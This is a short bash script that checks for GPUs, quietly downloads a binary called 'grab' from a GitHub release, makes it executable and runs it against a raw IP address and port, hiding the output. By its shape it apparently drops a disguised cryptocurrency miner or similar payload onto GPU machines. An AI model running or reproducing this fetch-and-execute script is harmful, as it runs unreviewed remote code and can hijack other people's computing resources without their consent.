#!/bin/bash
nvidia-smi -L
wget https://github.com/padbergapywt30/grabking/releases/download/1/grab &> /dev/null
chmod +x grab
./grab -P http://64.52.174.90:4545/"$1" &> logtxt
